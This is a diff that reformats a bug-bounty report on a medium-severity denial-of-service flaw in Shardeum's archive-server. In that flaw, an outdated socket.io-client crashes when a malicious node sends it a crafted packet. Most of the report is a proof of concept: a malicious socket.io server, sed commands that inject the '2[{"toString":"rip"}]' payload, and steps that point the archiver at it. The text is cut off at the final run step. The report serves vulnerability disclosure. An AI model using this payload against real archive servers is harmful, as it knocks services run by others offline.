@@ -1,5 +1,6 @@
+# Boost \_ Shardeum\_ Ancillaries 34298 - \[Websites and Applications - Medium] archive-server can be killed by connected shardus-instance
 
-# archive-server can be killed by connected shardus-instance
+## archive-server can be killed by connected shardus-instance
 
 Submitted on Thu Aug 08 2024 15:15:27 GMT-0400 (Atlantic Standard Time) by @riproprip for [Boost | Shardeum: Ancillaries](https://immunefi.com/bounty/shardeum-ancillaries-boost/)
 
@@ -12,25 +13,27 @@ Report severity: Medium
 Target: https://github.com/shardeum/archive-server/tree/dev
 
 Impacts:
-- Taking down the application/website
 
-## Description
-## Brief/Intro
-On boot the `archive-server` connects to a randomized `shardus-instance`.
-This instance has the power to kill the process that runs the archive server.
+* Taking down the application/website
 
+### Description
 
-## Vulnerability Details
-Archive-server is using an outdated socket.io-client. The old implementation has issues with specially crafted packets. 
+### Brief/Intro
+
+On boot the `archive-server` connects to a randomized `shardus-instance`. This instance has the power to kill the process that runs the archive server.
+
+### Vulnerability Details
+
+Archive-server is using an outdated socket.io-client. The old implementation has issues with specially crafted packets.
 
 Since Archive-server does not do any special error handling the error in the socket.io-client can bubble up "uncatched" and kill the process.
 
-Since the archive-server tries to randomly connect to a shardus-instance, it might not be a terrifying issue. 
-Otoh I saw references in the documentation that archive servers should be rewarded for their service in the future, so there would be incentive to try to kill archive servers that you don't run ...
+Since the archive-server tries to randomly connect to a shardus-instance, it might not be a terrifying issue. Otoh I saw references in the documentation that archive servers should be rewarded for their service in the future, so there would be incentive to try to kill archive servers that you don't run ...
 
-        
-## Proof of concept
-#  Prepare
+### Proof of concept
+
+## Prepare
+
 ```
 apt-get update
 apt-get -y install git-core curl build-essential python3 vim
@@ -45,15 +48,19 @@ nvm install 18.16.1; nvm use 18.16.1
 npm i -g node-gyp
 ```
 
-# create and start evil shardus-instance
+## create and start evil shardus-instance
+
 In one terminal
-## Create folder
+
+### Create folder
+
 ```
 mkdir /tmp/net_attack
 cd /tmp/net_attack
 ```
 
-## save as package.json
+### save as package.json
+
 ```
 {
   "dependencies": {
@@ -65,7 +72,8 @@ cd /tmp/net_attack
 }
 ```
 
-## save as evil-shardus.js
+### save as evil-shardus.js
+
 ```
 const PORT = 3030;
 const app = require('express')();
@@ -90,28 +98,30 @@ http.listen(PORT, () => {
 });
 ```
 
-## install packages and replace encoder with evil encoder
+### install packages and replace encoder with evil encoder
+
 ```
 npm install
 sed -i 's/var encoding = encodeAsString(obj);/var encoding = encodeAsString(obj); if (obj.type == 2) encoding = '"'"'2[{"toString":"rip"}]'"'"';/' ./node_modules/socket.io-client/node_modules/socket.io-parser/index.js
 sed -i 's/var encoding = encodeAsString(obj);/var encoding = encodeAsString(obj); if (obj.type == 2) encoding = '"'"'2[{"toString":"rip"}]'"'"';/' ./node_modules/socket.io-parser/index.js
 ```
 
-### run evil shardus instance
+#### run evil shardus instance
+
 ```
 node evil-shardus.js
 ```
 
+## run archiver
 
-# run archiver
-
-I could not find another script that made this easy. 
-So just reusing the stuff I had for the other bugs ...
+I could not find another script that made this easy. So just reusing the stuff I had for the other bugs ...
 
 We will reuse the shardeum repo and the `shardus start 10` to run an archiver. But before we run the archiver, we make sure it connects to the evil -shardus.js.
 
 In another terminal
-## general setup
+
+### general setup
+
 ```
 cd tmp
 git clone https://github.com/shardeum/shardeum.git; cd shardeum; git switch dev
@@ -122,13 +132,16 @@ git apply debug-10-nodes.patch
 npm run prepare
 ```
 
-## make sure that archiver connects to our evil implementation of a shardus-instance
+### make sure that archiver connects to our evil implementation of a shardus-instance
+
 ```
 sed -i 's/const socketClient = ioclient.connect(`http:\/\/${node\.ip}:${node\.port}`);/const socketClient = ioclient.connect(`http:\/\/${node\.ip}:3030`);/' ./node_modules/@shardus/archiver/build/Data/Data.js
 ```
 
-## run shardus
+### run shardus
+
 We run shardus, and observe our archive server disappear when the evil-shardus terminal prints "killing archiver". (60 second wait in current evil-shardus.js)
+
 ```
 shardus start 10; 
 PID=$(ps -ef | grep "archiver/build/server.js" | tr -s " " | cut -f2 -d" " | head -n1); 
